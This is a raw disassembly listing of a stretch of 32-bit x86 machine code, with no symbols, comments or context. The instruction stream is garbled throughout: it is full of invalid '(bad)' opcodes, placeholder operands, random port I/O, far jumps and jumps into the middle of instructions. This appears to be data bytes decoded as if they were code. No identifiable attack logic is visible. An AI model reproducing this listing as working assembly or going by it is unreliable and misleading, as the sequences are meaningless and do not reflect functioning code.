  418cf5:	push   esi
  418cf6:	mov    edi,0xe6f1e737
  418cfb:	inc    edi
  418cfc:	xchg   DWORD PTR [ecx-0x113f3ed1],ebp
  418d02:	repz mov ecx,0x96f4f632
  418d08:	ret    0xdc2d
  418d0b:	aam    0xe2
  418d0d:	cmp    BYTE PTR [ecx],bl
  418d0f:	(bad)  
  418d10:	outs   dx,DWORD PTR ds:[esi]
  418d11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d12:	fst    QWORD PTR [eax]
  418d14:	dec    esi
  418d15:	(bad)  
  418d17:	inc    ebx
  418d18:	mov    ecx,0x227d751b
  418d1d:	sbb    DWORD PTR [ebx-0x54],0x1641370f
  418d24:	aas    
  418d25:	test   eax,0x8aad5094
  418d2a:	push   ebx
  418d2b:	lods   al,BYTE PTR ds:[esi]
  418d2c:	mov    cs,WORD PTR [eax+0x3e]
  418d2f:	cmp    eax,0x28be218
  418d34:	pushf  
  418d35:	pop    ss
  418d36:	pop    esi
  418d37:	push   esp
  418d38:	test   eax,0x4b365a06
  418d3d:	jmp    0x3c42bf5c
  418d42:	add    al,0x90
  418d44:	sbb    eax,0x10853900
  418d49:	call   0xf6db6ec8
  418d4e:	ds mov ebp,0x63cadd69
  418d54:	std    
  418d55:	xchg   ecx,eax
  418d56:	push   0xeae3cf05
  418d5b:	inc    ch
  418d5d:	mov    BYTE PTR [ebx-0x3f],bh
  418d60:	jo     0x418cf1
  418d62:	and    dl,BYTE PTR [ecx+edx*4-0x31]
  418d66:	or     al,0x10
  418d68:	mov    eax,ds:0xcc888f5
  418d6d:	jmp    FWORD PTR [ebx+ecx*1+0x2ab775a]
  418d74:	mov    ebx,0x825e6988
  418d79:	repnz sub ch,BYTE PTR [edi]
  418d7c:	jmp    0x418d44
  418d7e:	lods   eax,DWORD PTR ds:[esi]
  418d7f:	xor    eax,0xb9c212be
  418d84:	in     eax,0x54
  418d86:	mov    bl,0xf7
  418d88:	adc    ah,BYTE PTR [edx]
  418d8a:	mov    ebp,0xb8fafef8
  418d8f:	aad    0x21
  418d91:	pop    edx
  418d92:	and    DWORD PTR [esi+0x1050595f],0x3155d669
  418d9c:	pop    edi
  418d9d:	xchg   ebx,eax
  418d9e:	dec    ecx
  418d9f:	sub    al,0x5a
  418da1:	push   ebp
  418da2:	xchg   ecx,eax
  418da3:	push   ds
  418da4:	xor    cl,BYTE PTR [ebp-0x7894c6c8]
  418daa:	aas    
  418dab:	mov    eax,0x40ec21e2
  418db0:	xchg   esi,eax
  418db1:	aas    
  418db2:	mov    ah,0x34
  418db4:	fdivr  QWORD PTR [edi]
  418db6:	pop    eax
  418db7:	div    DWORD PTR [edi-0x2be9c888]
  418dbd:	stos   BYTE PTR es:[edi],al
  418dbe:	fdivr  st,st(5)
  418dc0:	mov    ebx,?
  418dc2:	ds in  eax,dx
  418dc4:	test   ah,0x92
  418dc7:	xor    dh,bh
  418dc9:	mov    eax,0x6391be0f
  418dce:	aas    
  418dcf:	in     eax,dx
  418dd0:	in     eax,0xd7
  418dd2:	sub    al,0x8d
  418dd4:	cld    
  418dd5:	fs pop ecx
  418dd7:	js     0x418da9
  418dd9:	aas    
  418dda:	(bad)  
  418ddb:	xchg   esi,eax
  418ddc:	xor    ecx,DWORD PTR [eax+0x2e]
  418ddf:	add    eax,0x4f13e55c
  418de4:	fs dec ecx
  418de6:	inc    ebp
  418de7:	ds mov edx,0x9fd9bdd9
  418ded:	and    al,BYTE PTR [ebp-0x6f]
  418df0:	and    bl,ah
  418df2:	aad    0x1f
  418df4:	icebp  
  418df5:	jge    0x418ded
  418df7:	push   edi
  418df8:	xor    al,0x89
  418dfa:	rol    BYTE PTR [eax-0x16d0f222],cl
  418e00:	sbb    edi,eax
  418e02:	inc    esp
  418e03:	or     BYTE PTR [ebx+0x40eee3e7],dl
  418e09:	iret   
  418e0a:	inc    esp
  418e0b:	adc    eax,0x6564a327
  418e10:	push   eax
  418e11:	ds mov dh,0xb0
  418e14:	test   eax,0x9f0739cb
  418e19:	lods   al,BYTE PTR ds:[esi]
  418e1a:	inc    ebp
  418e1b:	jge    0x418e89
  418e1d:	inc    ebp
  418e1e:	inc    esp
  418e1f:	ret    
  418e20:	cwde   
  418e21:	fild   WORD PTR [ebp-0x41]
  418e24:	bound  esp,QWORD PTR [ecx]
  418e26:	daa    
  418e27:	je     0x418e0c
  418e29:	inc    BYTE PTR [ecx]
  418e2b:	dec    ecx
  418e2c:	test   eax,0xa477869
  418e31:	push   cs
  418e32:	lods   al,BYTE PTR ds:[esi]
  418e33:	dec    edx
  418e34:	int3   
  418e35:	ds mov al,0xf6
  418e38:	outs   dx,DWORD PTR ds:[esi]
  418e39:	call   0x9340:0x326545d4
  418e40:	int3   
  418e41:	jge    0xdd573cb4
  418e47:	xchg   BYTE PTR [edx],dh
  418e49:	cld    
  418e4a:	(bad)  
  418e4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e4c:	ins    BYTE PTR es:[edi],dx
  418e4d:	mov    ebp,0x58af47c8
  418e52:	fist   WORD PTR ds:0x2018cfba
  418e58:	mov    cl,0x4a
  418e5a:	js     0x418eda
  418e5c:	pop    ss
  418e5d:	inc    edi
  418e5e:	add    edi,DWORD PTR [ebp+0x7e]
  418e61:	shr    BYTE PTR [edi+esi*4+0x25],cl
  418e65:	mov    dl,0x91
  418e67:	inc    edx
  418e68:	pop    ebx
  418e69:	and    BYTE PTR ds:0x5d052fea,bh
  418e6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e70:	mov    bh,0x6a
  418e72:	pop    ds
  418e73:	mov    cl,0x4b
  418e75:	jecxz  0x418e62
  418e77:	imul   esp,DWORD PTR fs:0x50fbd15a,0x7b
  418e7f:	sbb    bh,cl
  418e81:	xor    esi,eax
  418e83:	je     0x418ec9
  418e85:	jmp    0x7234:0x6c1dc973
  418e8c:	dec    ecx
  418e8d:	rcr    esi,0x3d
  418e90:	les    esi,FWORD PTR [ebp+0x17]
  418e93:	or     ah,BYTE PTR [esi+0x40]
  418e96:	push   0xcd86b245
  418e9b:	stos   DWORD PTR es:[edi],eax
  418e9c:	ss out dx,al
  418e9e:	daa    
  418e9f:	jae    0x418f03
  418ea1:	sub    edx,ebp
  418ea3:	lds    esp,FWORD PTR [ecx]
  418ea5:	add    eax,0x67998ea5
  418eaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418eab:	sbb    al,0x3a
  418ead:	int    0x52
  418eaf:	xchg   ecx,eax
  418eb0:	cmp    ah,bh
  418eb2:	push   edx
  418eb3:	pop    ebx
  418eb4:	cli    
  418eb5:	mov    eax,ds:0x3fd67cdd
  418eba:	not    esp
  418ebc:	test   eax,0xc0e047c3
  418ec1:	dec    eax
  418ec2:	push   ds
  418ec3:	dec    edi
  418ec4:	dec    ebx
  418ec5:	pop    ds
  418ec6:	or     ebx,DWORD PTR [edi]
  418ec8:	mov    ebp,0xf380dc20
  418ecd:	jns    0x418ef9
  418ecf:	ins    BYTE PTR es:[edi],dx
  418ed0:	pop    esi
  418ed1:	adc    al,dl
  418ed3:	add    eax,0xaa17aafe
  418ed8:	push   ebp
  418ed9:	dec    ebp
  418eda:	jp     0x418f05
  418edc:	popf   
  418edd:	mov    edi,0x325c48a8
  418ee2:	push   DWORD PTR [eax+0x2b1b0698]
  418ee8:	leave  
  418ee9:	mov    dl,dh
  418eeb:	aas    
  418eec:	push   0x9a706361
  418ef1:	sahf   
  418ef2:	push   eax
  418ef3:	mov    dh,0x73
  418ef5:	mov    bh,0x56
  418ef7:	xor    eax,esi
  418ef9:	pop    ds
  418efa:	mov    dh,0xd3
  418efc:	dec    ebx
  418efd:	mov    ?,WORD PTR [eax-0x7bcb8529]
  418f03:	jns    0x418efd
  418f05:	add    BYTE PTR [esi],ah
  418f07:	loop   0x418e96
  418f09:	xchg   ebp,eax
  418f0a:	and    al,0xa2
  418f0c:	jg     0x418eb4
  418f0e:	mov    ah,0x3d
  418f10:	or     ah,BYTE PTR [edx+0x505d44db]
  418f16:	arpl   WORD PTR [esi+0x4],di
  418f19:	cmp    DWORD PTR [edi],0x38
  418f1c:	aas    
  418f1d:	pushf  
  418f1e:	idiv   DWORD PTR [ebp-0x60e2e6a5]
  418f24:	sbb    al,BYTE PTR [ebx-0x41]
  418f27:	data16 in al,dx
  418f29:	stos   DWORD PTR es:[edi],eax
  418f2a:	push   eax
  418f2b:	xchg   DWORD PTR es:[ecx],ecx
  418f2e:	xchg   cx,ax
  418f30:	nop
  418f31:	lods   eax,DWORD PTR ds:[esi]
  418f32:	popf   
  418f33:	and    eax,DWORD PTR [ecx+0x2f]
  418f36:	mov    dh,0x91
  418f38:	jg     0x418f98
  418f3a:	dec    DWORD PTR [ebx+ecx*8]
  418f3d:	ror    ch,1
  418f3f:	cli    
  418f40:	xor    BYTE PTR [edx],bl
  418f42:	fisubr DWORD PTR [eax+0x6b96c818]
  418f48:	push   ebx
  418f49:	mov    ?,WORD PTR [eax+0x3c]
  418f4c:	jmp    0x173a0cfa
  418f51:	enter  0xea9a,0x29
  418f55:	cmp    DWORD PTR [esi-0x76],edx
  418f58:	mov    eax,0x73b5c6ff
  418f5d:	enter  0xb250,0x75
  418f61:	lock pop ss
  418f63:	out    0xae,eax
  418f65:	mov    ds:0x863ec44,al
  418f6a:	jmp    0x418f52
  418f6c:	fadd   st(3),st
  418f6e:	sub    eax,ebp
  418f70:	ret    0x2306
  418f73:	mov    al,0x58
  418f75:	scas   al,BYTE PTR es:[edi]
  418f76:	fs xchg ecx,eax
  418f78:	dec    ebx
  418f79:	xchg   edi,eax
  418f7a:	aad    0x88
  418f7c:	push   0xa585d538
  418f81:	retf   
  418f82:	bound  ebp,QWORD PTR [ecx-0x7f]
  418f85:	das    
  418f86:	ret    
  418f87:	jmp    0xbeef:0xf83dfdf8
  418f8e:	adc    BYTE PTR [ecx],bh
  418f90:	sbb    bl,BYTE PTR [edi+0x2d]
  418f93:	sbb    esp,ebp
  418f95:	dec    ebx
  418f96:	xlat   BYTE PTR ds:[ebx]
  418f97:	mov    ?,WORD PTR [edx]
  418f99:	ins    BYTE PTR es:[edi],dx
  418f9a:	inc    ebp
  418f9b:	and    al,0xc8
  418f9d:	sar    bl,cl
  418f9f:	call   0x7102e2f9
  418fa4:	push   ebx
  418fa5:	arpl   WORD PTR [ebx-0x9],bx
  418fa8:	and    al,0xae
  418faa:	xor    DWORD PTR [esi+0x472b8247],esi
  418fb0:	and    eax,0x8a0a478e
  418fb5:	sub    BYTE PTR [ecx+ebx*8-0x6059951a],0xf2
  418fbd:	or     BYTE PTR [ebp-0x108e4e0a],0x3b
  418fc4:	(bad)  
  418fc6:	mov    ecx,0x79a4d331
  418fcb:	mov    bh,0xa8
  418fcd:	jmp    0x22aa2f07
  418fd2:	call   0xc7212243
  418fd7:	jmp    0x1e2eac93
  418fdc:	pop    edx
  418fdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418fde:	nop
  418fdf:	sbb    esp,DWORD PTR [eax+0x67]
  418fe2:	xchg   esp,eax
  418fe3:	hlt    
  418fe4:	rol    BYTE PTR [ebp+0x4d964b3f],1
  418fea:	je     0x418ff5
  418fec:	and    edx,DWORD PTR [ecx-0x329d870a]
  418ff2:	fisub  DWORD PTR ds:0xa11fef86
  418ff8:	mov    WORD PTR [eax],ds
  418ffa:	mov    bh,0xe8
  418ffc:	mov    bh,0x1b
  418ffe:	cmp    DWORD PTR ds:0x6999dcf5,edx
  419004:	dec    edx
  419005:	aad    0xd4
  419007:	add    ecx,esi
  419009:	aaa    
  41900a:	xor    BYTE PTR [esi-0x53727c15],0x73
  419011:	pop    edi
  419012:	jp     0x418fad
  419014:	mov    DWORD PTR [esi],eax
  419016:	outs   dx,BYTE PTR ds:[esi]
  419017:	mov    al,ds:0x2c65a2d6
  41901c:	in     al,0x81
  41901e:	iret   
  41901f:	fcomp  DWORD PTR [esi-0x24]
  419022:	pop    edx
  419023:	push   eax
  419024:	jo     0x419016
  419026:	dec    edi
  419027:	(bad)  
  419028:	stos   BYTE PTR es:[edi],al
  419029:	add    BYTE PTR [edx-0x7b25d887],bl
  41902f:	fistp  WORD PTR [ebx+0xb87418e]
  419035:	cdq    
  419036:	popa   
  419037:	mov    ah,0x45
  419039:	push   edx
  41903a:	mov    dl,BYTE PTR [eax-0x565b3387]
  419040:	and    eax,0xb7f4aa9
  419045:	lea    ebx,[edi+0x1c]
  419048:	ficomp WORD PTR [ebx+eax*2+0x1a0d6bc7]
  41904f:	int    0x9c
  419051:	add    DWORD PTR cs:[ebx+0x57],0x5c
  419056:	stos   BYTE PTR es:[edi],al
  419057:	cmp    ebx,esi
  419059:	shl    esi,cl
  41905b:	sbb    eax,0x4e107aba
  419060:	mov    bh,0x5
  419062:	jo     0x4190bf
  419064:	cmp    al,0x2e
  419066:	dec    edi
  419067:	add    ecx,DWORD PTR [ecx-0x77]
  41906a:	cmp    al,0xb1
  41906c:	push   ss
  41906d:	cdq    
  41906e:	mov    ebp,0x93049d58
  419073:	add    esi,0xfffffff6
  419076:	sbb    BYTE PTR [edi-0x2c],bh
  419079:	in     al,dx
  41907a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41907b:	mov    eax,0x447542b7
  419080:	cld    
  419081:	aaa    
  419082:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419083:	out    dx,al
  419084:	or     eax,0xef40b058
  419089:	inc    ebp
  41908a:	adc    DWORD PTR [ecx+0x4b250c6f],esi
  419090:	mov    dl,0xc9
  419092:	pop    ecx
  419093:	push   ss
  419094:	shl    BYTE PTR [esi+0x514daf29],0x14
  41909b:	sti    
  41909c:	loop   0x4190e7
  41909e:	xchg   BYTE PTR [edi-0x1ea0889f],cl
  4190a4:	stc    
  4190a5:	push   esi
  4190a6:	dec    edi
  4190a7:	adc    ebx,DWORD PTR [ebx]
  4190a9:	jecxz  0x419118
  4190ab:	or     BYTE PTR [ebp-0x4b84952a],al
  4190b1:	jle    0x41912b
  4190b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4190b4:	dec    esi
  4190b5:	call   0x96ef4a3a
  4190ba:	ja     0x41903f
  4190bc:	mov    ebx,DWORD PTR [edx-0x507cfe69]
  4190c2:	jp     0x41913e
  4190c4:	pop    eax
  4190c5:	arpl   ax,bx
  4190c7:	push   ds
  4190c8:	dec    eax
  4190c9:	jg     0x419094
  4190cb:	stos   BYTE PTR es:[edi],al
  4190cc:	jbe    0x41912d
  4190ce:	div    DWORD PTR [ebx+0x3221962a]
  4190d4:	sub    al,0xd2
  4190d6:	mov    ebx,0x98cfa387
  4190db:	cld    
  4190dc:	add    ebp,DWORD PTR [ebx-0x1438bce7]
  4190e2:	(bad)  
  4190e3:	xor    al,BYTE PTR [edx]
  4190e5:	or     al,0x2e
  4190e7:	cld    
  4190e8:	aam    0x27
  4190ea:	fs xchg ecx,eax
  4190ec:	mov    dl,0x95
  4190ee:	pop    ebx
  4190ef:	adc    al,0xb0
  4190f1:	loop   0x4190d5
  4190f3:	mov    cs,WORD PTR [edx]
  4190f5:	fs jno 0x4190db
  4190f8:	ins    BYTE PTR es:[edi],dx
  4190f9:	push   eax
  4190fa:	push   ebp
  4190fb:	dec    ebp
  4190fc:	shl    ch,0x3
  4190ff:	and    DWORD PTR [ebp+edx*8+0x762343a1],edi
  419106:	mov    BYTE PTR es:[ecx+0x57],bh
  41910a:	sub    BYTE PTR [ecx+0x5578f780],al
  419110:	ret    
  419111:	ud0    ebp,DWORD PTR [esp+esi*8+0x9870410]
  419119:	imul   ebx,DWORD PTR [eax+eax*4+0x5b],0x3d
  41911e:	xchg   ebx,eax
  41911f:	pop    ebx
  419120:	aad    0xb4
  419122:	mov    BYTE PTR [eax-0x47a51d23],bh
  419128:	cmp    eax,0x3b550b02
  41912d:	push   esp
  41912e:	das    
  41912f:	int3   
  419130:	loopne 0x419163
  419132:	out    0x67,al
  419134:	lods   eax,DWORD PTR ds:[esi]
  419135:	retf   
  419136:	fdivr  QWORD PTR [eax+edx*8]
  419139:	inc    esp
  41913a:	cmp    al,0x79
  41913c:	cwde   
  41913d:	add    edi,DWORD PTR [esi-0x1989d15a]
  419143:	mov    edi,0x6fa67f4b
  419148:	rcl    DWORD PTR [edi-0x27151060],cl
  41914e:	mov    ds:0xeb4c4e0d,eax
  419153:	and    BYTE PTR [edi+0x2ca75bd2],bl
  419159:	call   FWORD PTR [edi-0x4763a25c]
  41915f:	sub    DWORD PTR [esi],ebp
  419161:	inc    ecx
  419162:	xchg   edi,eax
  419163:	inc    ebp
  419164:	(bad)  
  419166:	ret    0x6b91
  419169:	icebp  
  41916a:	push   es
  41916b:	dec    ebx
  41916c:	sbb    cl,BYTE PTR ds:[edx]
  41916f:	jge    0x41919b
  419171:	xchg   ebx,eax
  419172:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419173:	pop    esp
  419174:	mov    ds:0xca6b604c,al
  419179:	rcr    DWORD PTR [ebx],1
  41917b:	jle    0x41913e
  41917d:	hlt    
  41917e:	mov    al,ah
  419180:	out    0xd8,al
  419182:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419183:	idiv   BYTE PTR [eax]
  419185:	imul   ebx,DWORD PTR [edi],0xaa5d5c61
  41918b:	sbb    al,0x8b
  41918d:	popf   
  41918e:	in     al,dx
  41918f:	test   al,0xef
  419191:	jge    0x4191e6
  419193:	sbb    DWORD PTR [eax-0x6f],esp
  419196:	inc    edi
  419197:	in     al,0x86
  419199:	or     DWORD PTR [edx-0x6e1e16a3],edi
  41919f:	aam    0x57
  4191a1:	mov    dl,0x26
  4191a3:	pop    es
  4191a4:	cdq    
  4191a5:	aaa    
  4191a6:	pushf  
  4191a7:	rcr    BYTE PTR [ecx+0x15],cl
  4191aa:	test   eax,0x33c9ef13
  4191af:	push   esp
  4191b0:	pop    ecx
  4191b1:	xor    BYTE PTR [eax+0x43],ah
  4191b4:	xchg   ebx,eax
  4191b5:	fbld   TBYTE PTR [eax+esi*4+0x1f]
  4191b9:	stos   BYTE PTR es:[edi],al
  4191ba:	and    eax,0xc7f05890
  4191bf:	push   0x34
  4191c1:	ja     0x41919f
  4191c3:	cmc    
  4191c4:	and    eax,0xcfbdfecd
  4191c9:	popa   
  4191ca:	test   al,0x91
  4191cd:	call   0xc7e1b06c
  4191d2:	add    al,0xec
  4191d4:	and    DWORD PTR ds:[ecx+0x5e],eax
  4191d8:	xor    al,0x5f
  4191da:	rcl    DWORD PTR [ecx+edx*4],1
  4191dd:	mov    edi,0x5e834377
  4191e2:	sub    DWORD PTR [ebx+0x17b82310],ebp
  4191e8:	inc    edi
  4191e9:	cwde   
  4191ea:	and    cl,ah
  4191ec:	lahf   
  4191ed:	jmp    0x41925c
  4191ef:	ins    BYTE PTR es:[edi],dx
  4191f0:	push   es
  4191f1:	xchg   esp,eax
  4191f2:	pop    edi
  4191f3:	shl    BYTE PTR [edi+0x19],cl
  4191f6:	sbb    BYTE PTR [esi-0xa70a5b],cl
  4191fc:	adc    BYTE PTR [eax+0x72bec26],bl
  419202:	mov    ebp,0xcba2c096
  419207:	enter  0xc001,0x86
  41920b:	jg     0x41919f
  41920d:	jp     0x4191ca
  41920f:	out    dx,al
  419210:	fisubr WORD PTR [ecx+0x61]
  419213:	jge    0x419266
  419215:	stos   BYTE PTR es:[edi],al
  419216:	mov    ch,0x5e
  419218:	pop    ecx
  419219:	sti    
  41921a:	stc    
  41921b:	or     DWORD PTR [esi+0x3c165444],edi
  419221:	pop    ebp
  419222:	cmp    DWORD PTR ds:0xdd400cb9,ecx
  419228:	sub    ah,BYTE PTR [edi]
  41922a:	inc    ebx
  41922b:	in     al,dx
  41922c:	add    eax,0xf1657b8f
  419231:	daa    
  419232:	test   DWORD PTR [ebp+0x23e596c4],0x8dc5904f
  41923c:	sbb    eax,0x400170c5
  419241:	inc    edi
  419242:	sub    eax,0xf39254bf
  419247:	ins    DWORD PTR es:[edi],dx
  419248:	push   0xd01aa93f
  41924d:	lods   eax,DWORD PTR ds:[esi]
  41924e:	outs   dx,DWORD PTR ds:[esi]
  41924f:	add    eax,0xb266e8c4
  419254:	pop    ecx
  419255:	pop    edi
  419256:	int    0x28
  419258:	xchg   esp,eax
  419259:	loop   0x4191e9
  41925b:	cld    
  41925c:	int3   
  41925d:	ins    BYTE PTR es:[edi],dx
  41925e:	sbb    cl,bl
  419260:	xchg   esi,eax
  419261:	fs jge 0x4192c1
  419264:	mov    ebx,0xede2645f
  419269:	dec    esp
  41926a:	jmp    0x64a4:0xda0f8336
  419271:	stos   DWORD PTR es:[edi],eax
  419272:	dec    edx
  419273:	ds push eax
  419275:	imul   edx,DWORD PTR [ebx-0x57],0x15
  419279:	mov    ds:0x422b7cb0,eax
  41927e:	inc    eax
  41927f:	(bad)  
  419280:	and    BYTE PTR [ebx-0x1935838f],cl
  419286:	mov    eax,ds:0xb8e2f35a
  41928b:	enter  0xfd5f,0xcb
  41928f:	mov    ch,0xcb
  419291:	cmp    eax,0x706b5e55
  419296:	lods   eax,DWORD PTR ds:[esi]
  419297:	iret   
  419298:	ret    
  419299:	sbb    cl,BYTE PTR [ecx-0x2d]
  41929c:	ror    BYTE PTR cs:[edi],1
  41929f:	ret    0xf099
  4192a2:	jns    0x419251
  4192a4:	dec    eax
  4192a5:	or     eax,DWORD PTR [edx]
  4192a7:	mov    bh,0xb7
  4192a9:	mov    ss,WORD PTR [ebx]
  4192ab:	clc    
  4192ac:	sub    al,0xb8
  4192ae:	inc    ebx
  4192af:	je     0x419265
  4192b1:	fdivp  st(6),st
  4192b3:	mov    dh,0xf2
  4192b5:	push   esp
  4192b6:	out    dx,eax
  4192b7:	xor    BYTE PTR [esi],ch
  4192b9:	and    dl,bh
  4192bb:	out    dx,eax
  4192bc:	ja     0x4192af
  4192be:	jg     0x419309
  4192c0:	or     al,0x54
  4192c2:	pop    ebx
  4192c3:	inc    ecx
  4192c4:	mov    dl,0x9d
  4192c6:	lea    eax,[ebp+0x6f]
  4192c9:	das    
  4192ca:	aaa    
  4192cb:	mov    edx,DWORD PTR [ebx]
  4192cd:	dec    eax
  4192ce:	mov    ebx,0x2b301075
  4192d3:	mov    ch,0x42
  4192d5:	(bad)  
  4192d6:	and    ebx,DWORD PTR [eax-0x54b23044]
  4192dc:	mov    esi,0x9ed48be5
  4192e1:	mov    esp,0x347ddb21
  4192e6:	xor    ebp,DWORD PTR [ebp+0x5a]
  4192e9:	xor    ecx,DWORD PTR [ebx]
  4192eb:	adc    BYTE PTR [ecx+0x55207aed],dh
  4192f1:	xlat   BYTE PTR ds:[ebx]
  4192f2:	rol    al,1
  4192f4:	push   eax
  4192f5:	adc    esp,ecx
  4192f7:	or     BYTE PTR [ebp-0x3c977e0e],dl
  4192fd:	mov    cl,0x59
  4192ff:	mov    ebx,0x6d02fa45
  419304:	push   esp
  419305:	xchg   edi,eax
  419306:	mov    ecx,edx
  419308:	mov    eax,ds:0x32269aa2
  41930d:	ret    
  41930e:	jecxz  0x41936b
  419310:	add    al,0x9d
  419312:	inc    esi
  419313:	pop    edi
  419314:	jmp    0xfe2343cd
  419319:	in     eax,0x58
  41931b:	js     0x4192b5
  41931d:	push   cs
  41931e:	cli    
  41931f:	pushf  
  419320:	fmul   DWORD PTR ds:0xa3d0fa41
  419326:	jle    0x419301
  419328:	lods   eax,DWORD PTR ds:[esi]
  419329:	pop    ss
  41932a:	cmc    
  41932b:	xchg   esp,eax
  41932c:	not    al
  41932e:	mov    cl,0xd8
  419330:	xor    BYTE PTR [ecx],0x57
  419333:	add    DWORD PTR [edi-0x53ff1c47],0x3f
  41933a:	and    eax,0xffffffa4
  41933d:	mov    ah,cl
  41933f:	xchg   DWORD PTR [edi+ebx*1-0x5e29c7d4],esp
  419346:	add    dl,BYTE PTR [ebx+0x61]
  419349:	inc    eax
  41934a:	lds    ebp,FWORD PTR [ebx-0x5d]
  41934d:	jmp    0xc34c:0x5080a522
  419354:	test   edi,esi
  419356:	sbb    ecx,DWORD PTR [esi+0x72f03515]
  41935c:	mov    al,BYTE PTR [ebx+0x7d]
  41935f:	cli    
  419360:	shl    BYTE PTR [esp+edi*4+0x114a9699],cl
  419367:	in     al,dx
  419368:	inc    esp
  419369:	lock and bl,BYTE PTR [ebx-0x717d5ec9]
  419370:	inc    esp
  419371:	or     BYTE PTR [eax-0x432a55ef],ah
  419377:	das    
  419378:	out    0x30,eax
  41937a:	dec    ebx
  41937b:	adc    DWORD PTR [edi],edx
  41937d:	enter  0x1f82,0x96
  419381:	test   cl,al
  419383:	mov    al,0xa1
  419385:	shl    DWORD PTR [ebp+0x4e37437d],0x45
  41938c:	leave  
  41938d:	clc    
  41938e:	mov    BYTE PTR [edi+0x15],bl
  419391:	mov    eax,DWORD PTR [ebx+0x263205e8]
  419397:	push   ebp
  419398:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419399:	(bad)
  41939d:	xor    esp,DWORD PTR [esi+0x1a]
  4193a0:	test   al,0xea
  4193a2:	sub    DWORD PTR [eax],ebp
  4193a4:	enter  0xea5f,0xe2
  4193a8:	jnp    0x4193c9
  4193aa:	add    edi,DWORD PTR [ecx+0x18]
  4193ad:	rol    ebx,cl
  4193af:	lea    edi,[edx-0xd2f38a7]
  4193b5:	xor    eax,0xceddc6db
  4193ba:	jmp    0x4366f85b
  4193bf:	jmp    0x419395
  4193c1:	xlat   BYTE PTR ds:[ebx]
  4193c2:	mov    al,0x5d
  4193c4:	jne    0x41935a
  4193c6:	lods   ax,WORD PTR ds:[esi]
  4193c8:	mov    gs,WORD PTR [ebx-0x67]
  4193cb:	(bad)  
  4193cd:	lods   al,BYTE PTR ds:[esi]
  4193ce:	addr16 inc esi
  4193d0:	pop    esi
  4193d1:	pop    ss
  4193d2:	and    al,0x27
  4193d4:	pushf  
  4193d5:	push   eax
  4193d6:	out    0xc7,eax
  4193d8:	(bad)  
  4193d9:	rol    DWORD PTR [ebx-0x436dfc27],1
  4193df:	stos   BYTE PTR es:[edi],al
  4193e0:	push   ebx
  4193e1:	js     0x419402
  4193e3:	ds lahf 
  4193e5:	into   
  4193e6:	xchg   edx,eax
  4193e7:	rcr    ecx,0x1
  4193ea:	in     eax,dx
  4193eb:	push   edx
  4193ec:	bound  eax,QWORD PTR [ebp-0x30168f2e]
  4193f2:	es (bad) 
  4193f4:	lock push ss
  4193f6:	scas   al,BYTE PTR es:[edi]
  4193f7:	dec    ecx
  4193f8:	not    BYTE PTR [edi]
  4193fa:	repnz or eax,0x248b128c
  419400:	and    DWORD PTR [ecx],ebp
  419402:	stc    
  419403:	or     bl,ah
  419405:	je     0x41945f
  419407:	lods   eax,DWORD PTR ds:[esi]
  419408:	jl     0x4193b3
  41940a:	daa    
  41940b:	push   cs
  41940c:	mov    bl,0xf
  41940e:	call   0x48e0258c
  419413:	lahf   
  419414:	xchg   ebx,eax
  419415:	lods   al,BYTE PTR ds:[esi]
  419416:	aam    0x6c
  419418:	in     eax,dx
  419419:	push   edx
  41941a:	fldz   
  41941c:	mov    cs,WORD PTR es:[ebx-0x1efbd18e]
  419423:	add    ah,BYTE PTR [esi+ecx*1+0x7c]
  419427:	mov    ah,0xd
  419429:	push   0xffffffbf
  41942b:	repnz gs fsub st(6),st
  41942f:	add    eax,0xcba41f1d
  419434:	call   0xd552e3c2
  419439:	push   es
  41943a:	ds loopne 0x41948b
  41943d:	push   edi
  41943e:	and    esp,DWORD PTR [edi+0x113be8d]
  419444:	iret   
  419445:	ss popf 
  419447:	sub    dh,ch
  419449:	adc    BYTE PTR [ebx-0x60],bh
  41944c:	mov    ebp,0x17e60887
  419451:	mov    edx,0x86964b7d
  419456:	jle    0x41949a
  419458:	int3   
  419459:	fld    DWORD PTR [ecx]
  41945b:	dec    esp
  41945c:	mov    edi,0xb3aa279c
  419461:	jmp    0x41940d
  419463:	and    DWORD PTR [edx-0x78],esp
  419466:	cld    
  419467:	cs xchg edi,eax
  419469:	sbb    eax,0x572cb4ba
  41946e:	repz mov esp,0x9d5628ba
  419474:	fmul   DWORD PTR [eax]
  419476:	out    0x64,al
  419478:	inc    esp
  419479:	and    BYTE PTR [esi-0xd2db383],ch
  41947f:	int    0x33
  419481:	outs   dx,DWORD PTR ds:[esi]
  419482:	les    eax,FWORD PTR [eax-0x7374fcbd]
  419488:	in     eax,dx
  419489:	mov    edx,0x2b53bcc4
  41948e:	into   
  41948f:	push   ecx
  419490:	pusha  
  419491:	(bad)  
  419492:	jecxz  0x4194bb
  419494:	cmp    al,0xeb
  419496:	js     0x41942f
  419498:	xchg   ebx,eax
  419499:	mov    dh,cl
  41949b:	popf   
  41949c:	cmc    
  41949d:	jecxz  0x41944d
  41949f:	not    DWORD PTR [ecx-0x5b]
  4194a2:	hlt    
  4194a3:	adc    eax,0x275c35cb
  4194a8:	xor    eax,0xb5303a1
  4194ad:	fnstsw WORD PTR [ebp+0x48]
  4194b0:	bound  edx,QWORD PTR [eax]
  4194b2:	adc    dl,bl
  4194b4:	and    edi,ecx
  4194b6:	jp     0x4194ba
  4194b8:	jmp    0x5dd04b62
  4194bd:	outs   dx,BYTE PTR ds:[esi]
  4194be:	repz ja 0x41953d
  4194c1:	add    al,BYTE PTR [ebp+0x1d]
  4194c4:	adc    al,0xe3
  4194c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4194c7:	xor    eax,0xa17027c3
  4194cc:	sbb    eax,0x76
  4194cf:	sbb    bh,BYTE PTR ds:0x9633767a
  4194d5:	mov    ebx,0xba673946
  4194da:	or     dl,BYTE PTR [edx]
  4194dc:	sbb    BYTE PTR [ebx+0x1d0424d1],ch
